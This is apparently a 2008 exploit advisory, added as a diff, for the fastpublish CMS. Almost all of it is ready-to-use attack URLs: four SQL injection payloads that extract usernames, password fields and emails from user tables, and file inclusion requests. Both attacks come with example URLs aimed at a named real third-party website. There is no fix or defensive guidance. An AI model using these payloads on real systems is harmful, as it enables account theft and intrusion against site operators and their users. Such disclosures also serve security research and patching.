@@ -1,0 +1,41 @@
+Author: ~!Dok_tOR!~
+Date found: 30.09.08
+Product: fastpublish CMS
+Version: 1.9.9.9.9.d
+URL: www.fastpublish.de
+Download: http://www.fastpublish.de/rich_files/attachments/downloads/fastpublish_19999d_trial.zip
+Vulnerability Class: SQL Injection
+
+SQL Injection
+
+Exploit 1:
+
+http://localhost/[installdir]/index2.php?q=dok&sprache=-1'+union+select+1,2,3,4,5,concat_ws(0x3a,user_type,user_name,user_pw),7,8,9,10+from+fastpublish__forumen_userdata/*
+
+Exploit 2:
+
+http://localhost/[installdir]/index2.php?q=dok&sprache=-1'+union+select+1,2,3,4,5,concat_ws(0x3a,user_type,user_name,user_pw),7,8,9,10+from+fastpublish__forum_de_userdata/*
+
+Exploit 3:
+
+http://localhost/[installdir]/index2.php?q=dok&sprache=-1'+union+select+1,2,3,4,5,concat_ws(0x3a,benutzer,passwortm,email),7,8,9,10+from+fastpublish_benutzer/*
+
+Exploit 4:
+
+http://localhost/[installdir]/index.php?artikel=-1+union+select+1,2,concat_ws(0x3a,user_type,user_name,user_pw),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+from+fastpublish__forumen_userdata/*
+
+Example:
+
+http://www.jeremias-d-meissner.de/index2.php?q=dok&sprache=-1'+union+select+1,2,3,4,5,concat_ws(0x3a,user_type  ,user_name,user_pw),7,8,9,10+from+fastpublish__for  um_de_userdata/*
+
+File inclusion
+
+http://localhost/index2.php?artikel=3&target=./[file]
+
+http://localhost/index.php?artikel=2&target=./[file]
+
+Example:
+
+http://www.jeremias-d-meissner.de/index2.php?artikel=3&target=./forgotpassword.php
+
+# milw0rm.com [2008-10-05]
